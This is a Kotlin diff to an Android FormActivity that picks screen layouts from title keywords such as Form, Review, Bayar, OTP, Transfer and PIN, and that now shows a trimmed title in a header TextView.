@@ -326,9 +326,9 @@ class FormActivity : AppCompatActivity() {
 
     private fun handleScreenTitle(screenTitle: String) {
         val layoutId = when {
-            screenTitle.contains("Form", ignoreCase = true) -> R.layout.activity_form2
-            screenTitle.contains("Review", ignoreCase = true) -> R.layout.activity_review
-            screenTitle.contains("Bayar", ignoreCase = true) -> R.layout.activity_bayar
+            screenTitle.contains("Form", ignoreCase = true) -> R.layout.header
+            screenTitle.contains("Review", ignoreCase = true) -> R.layout.header
+//            screenTitle.contains("Bayar", ignoreCase = true) -> R.layout.activity_bayar
             screenTitle.contains("Pilih", ignoreCase = true) -> R.layout.pilihan_otp
             screenTitle.contains("Transfer", ignoreCase = true) -> R.layout.activity_transfer
             screenTitle.contains("PIN", ignoreCase = true) -> R.layout.screen_pin
@@ -343,6 +343,19 @@ class FormActivity : AppCompatActivity() {
             setContentView(layoutId)
             Log.d("FormActivity", "Displaying layout with ID: $layoutId")
         }
+
+        if (screenTitle.contains("Form", ignoreCase = true)) {
+            val processedTitle = screenTitle.replace("FORM", "", ignoreCase = true).trim()
+            val textView: TextView = findViewById(R.id.text_center)
+            textView?.text = processedTitle
+        }
+
+        if (screenTitle.contains("Review", ignoreCase = true)) {
+            val processedTitle = screenTitle.replace("Review", "", ignoreCase = true).trim()
+            val textView: TextView = findViewById(R.id.text_center)
+            textView?.text = processedTitle
+        }
+
         if (screenTitle.contains("Berhasil", ignoreCase = true)) {
             val formattedTitle = screenTitle.replace("Berhasil", "").trim()
             Log.d("FormActivity", "Formatted title: $formattedTitle")
